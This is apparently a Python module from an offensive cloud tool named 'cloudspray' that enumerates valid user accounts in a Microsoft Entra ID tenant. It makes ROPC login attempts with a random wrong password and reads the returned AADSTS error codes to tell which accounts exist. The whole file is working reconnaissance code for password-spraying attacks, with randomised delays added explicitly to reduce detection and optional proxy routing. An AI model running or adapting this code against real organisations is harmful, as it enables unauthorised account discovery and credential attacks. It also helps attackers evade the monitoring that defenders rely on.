"""Login-based user enumeration via ROPC authentication.

Noisy technique that generates failed login events in the target tenant's logs.
Attempts authentication with a known-wrong password and interprets the resulting
AADSTS error code to determine whether the user account exists.
"""

import random
import time
import uuid

import requests

from cloudspray.constants.error_codes import AuthResult
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.spray.auth import Authenticator
from cloudspray.state.db import StateDB
from cloudspray.state.models import EnumResult
from cloudspray.utils import normalize_email

METHOD_NAME = "login"

# AuthResult values that confirm the account exists
_EXISTS_RESULTS = frozenset({
    AuthResult.INVALID_PASSWORD,
    AuthResult.ACCOUNT_LOCKED,
    AuthResult.ACCOUNT_DISABLED,
    AuthResult.VALID_PASSWORD_MFA_REQUIRED,
    AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,
    AuthResult.VALID_PASSWORD_CA_BLOCKED,
    AuthResult.VALID_PASSWORD_EXPIRED,
    AuthResult.SUCCESS,
})

# AuthResult values that confirm the account does NOT exist
_NOT_FOUND_RESULTS = frozenset({
    AuthResult.USER_NOT_FOUND,
})


class LoginEnumerator:
    """Enumerate users via ROPC authentication with a wrong password.

    Noisy technique: generates failed login events in target tenant logs.
    Uses MSAL ROPC with a random garbage password to trigger error codes:
    - AADSTS50126 = user exists (invalid password means user was found)
    - AADSTS50034 = user does not exist
    - AADSTS50053 = account locked (user exists)
    - AADSTS50057 = account disabled (user exists)
    """

    def __init__(
        self,
        domain: str,
        db: StateDB,
        reporter: ConsoleReporter,
        proxy_session: requests.Session | None = None,
    ):
        self._domain = domain
        self._db = db
        self._reporter = reporter
        self._authenticator = Authenticator(domain, proxy_session=proxy_session)

    def _classify_existence(self, auth_result: AuthResult) -> bool | None:
        """Map an AuthResult to an existence determination.

        Returns:
            True if the user definitely exists, False if definitely not,
            None if the result is ambiguous.
        """
        if auth_result in _EXISTS_RESULTS:
            return True
        if auth_result in _NOT_FOUND_RESULTS:
            return False
        return None

    def enumerate(self, usernames: list[str]) -> list[str]:
        """Attempt login with wrong passwords to enumerate users.

        Args:
            usernames: List of email addresses to check.

        Returns:
            List of confirmed existing users.
        """
        confirmed: list[str] = []
        usernames = list(dict.fromkeys(usernames))  # preserve order, remove dupes

        for username in usernames:
            email = normalize_email(username, self._domain)

            # Use a random UUID as the password so it is guaranteed wrong
            fake_password = str(uuid.uuid4())

            attempt = self._authenticator.attempt(email, fake_password)
            existence = self._classify_existence(attempt.result)

            if existence is None:
                self._reporter.debug(
                    f"Ambiguous result for {email}: {attempt.result.value}"
                )
                exists = False
            else:
                exists = existence

            if exists:
                confirmed.append(email)

            result = EnumResult(username=email, method=METHOD_NAME, exists=exists)
            self._db.record_enum_result(result)
            self._reporter.print_enum_result(email, exists, METHOD_NAME)

            # Delay between attempts to reduce detection risk
            time.sleep(random.uniform(1.0, 3.0))

        return confirmed
